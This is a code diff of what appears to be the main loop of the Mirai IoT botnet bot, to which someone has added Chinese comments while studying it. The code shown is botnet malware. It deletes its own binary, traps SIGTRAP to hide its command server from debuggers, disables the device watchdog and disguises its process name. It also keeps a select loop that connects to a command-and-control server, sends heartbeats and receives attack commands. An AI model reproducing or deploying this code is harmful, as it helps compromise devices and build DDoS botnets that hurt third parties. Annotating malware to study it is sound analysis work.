@@ -32,8 +32,14 @@ static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;
-int fd_ctrl = -1, fd_serv = -1;
-BOOL pending_connection = FALSE;
+
+
+int fd_ctrl = -1, fd_serv = -1;//ctrl集合  serv集合
+
+
+BOOL pending_connection = FALSE;//pengding状态
+
+
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
 #ifdef DEBUG
@@ -57,7 +63,7 @@ int main(int argc, char **args)
     sigset_t sigs;
     int wfd;
 
-    // Delete self
+    // Delete self    unlink本程序，等到打开这个文件的进程关闭这个文件的文件描述符后删除这个文件
     unlink(args[0]);
 
     // Signal based control flow
@@ -65,9 +71,9 @@ int main(int argc, char **args)
     sigaddset(&sigs, SIGINT);
     sigprocmask(SIG_BLOCK, &sigs, NULL);
     signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
+    signal(SIGTRAP, &anti_gdb_entry);  //阻止gdb调试   由断点指令或其它trap指令产生. 由debugger使用。
 
-    // Prevent watchdog from rebooting device
+    // Prevent watchdog from rebooting device   关闭看门狗
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||
         (wfd = open("/dev/misc/watchdog", 2)) != -1)
     {
@@ -129,13 +135,13 @@ int main(int argc, char **args)
     name_buf_len = ((rand_next() % 4) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
-    util_strcpy(args[0], name_buf);
+    util_strcpy(args[0], name_buf);//拷贝进args[0]就行了？？？？？？？？
 
     // Hide process name　　　加密进程名
     name_buf_len = ((rand_next() % 6) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
-    prctl(PR_SET_NAME, name_buf);
+    prctl(PR_SET_NAME, name_buf);  //prctl函数设置进程名
 
     // Print out system exec
     table_unlock_val(TABLE_EXEC_SUCCESS);
@@ -163,38 +169,47 @@ int main(int argc, char **args)
 #endif
 
     //父进程， 即main函数的主循环去监控bot和cnc之间的connection，而子进程在scanner_init中扫描并上报（上报也是一个子进程）
-    while (TRUE)
+    while (TRUE)//while(1)一直轮训select，监听连接事件和数据收发事件
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
         struct timeval timeo;
         int mfd, nfds;
 
-        FD_ZERO(&fdsetrd);
+        FD_ZERO(&fdsetrd);//使用select 之前先把集合清零
         FD_ZERO(&fdsetwr);
 
-        // Socket for accept()
+
+
+/*从建立连接到收发数据 select监听的对象的不同*/  
+
+        // Socket for accept()    
         if (fd_ctrl != -1)
             FD_SET(fd_ctrl, &fdsetrd);
 
         // Set up CNC sockets
         if (fd_serv == -1)
-            establish_connection();
+            establish_connection();//建立与ＣＮＣ之间的连接
 
         if (pending_connection)
-            FD_SET(fd_serv, &fdsetwr);
+            FD_SET(fd_serv, &fdsetwr);//fd_serv加入到fdsetwr集合中
         else
             FD_SET(fd_serv, &fdsetrd);
 
-        // Get maximum FD for select
+
+
+
+
+
+        // Get maximum FD for select   select 的第一个参数是要监听的fd集合的最大值
         if (fd_ctrl > fd_serv)
-            mfd = fd_ctrl;
+            mfd = fd_ctrl;//ctrl集合
         else
-            mfd = fd_serv;
+            mfd = fd_serv;//serv集合
 
         // Wait 10s in call to select()　　　　select等待CNC下发命令　　
         timeo.tv_usec = 0;
         timeo.tv_sec = 10;
-        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
+        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);　　//阻塞10s
         if (nfds == -1)
         {
 #ifdef DEBUG
@@ -210,8 +225,8 @@ int main(int argc, char **args)
                 send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);  //心跳包2个字节
         }
 
-        // Check if we need to kill ourselves
-        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
+        // Check if we need to kill ourselves　　多实例检测，确保只有一个进程运行
+        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))  //fd_ctrl是否可以读写
         {
             struct sockaddr_in cli_addr;
             socklen_t cli_addr_len = sizeof (cli_addr);
@@ -230,19 +245,19 @@ int main(int argc, char **args)
             exit(0);
         }
 
-        // Check if CNC connection was established or timed out or errored
+        // Check if CNC connection was established or timed out or errored　　连接检测和错误处理
         if (pending_connection)//正在建立与cnc的连接
         {
             pending_connection = FALSE;
 
-            if (!FD_ISSET(fd_serv, &fdsetwr))
+            if (!FD_ISSET(fd_serv, &fdsetwr))//fd_serv上的写事件
             {
 #ifdef DEBUG
                 printf("[main] Timed out while connecting to CNC\n");
 #endif
                 teardown_connection();
             }
-            else
+            else//fd_serv上发生写事件
             {
                 int err = 0;
                 socklen_t err_len = sizeof (err);
@@ -274,7 +289,7 @@ int main(int argc, char **args)
                 }
             }
         }
-        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
+        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))//监听到fd_serv的读事件，即收到命令
         {
             int n;
             uint16_t len;
@@ -354,7 +369,7 @@ int main(int argc, char **args)
 
 static void anti_gdb_entry(int sig)
 {
-    resolve_func = resolve_cnc_addr;
+    resolve_func = resolve_cnc_addr;//啥？
 }
 
 //获取cnc域名和端口 
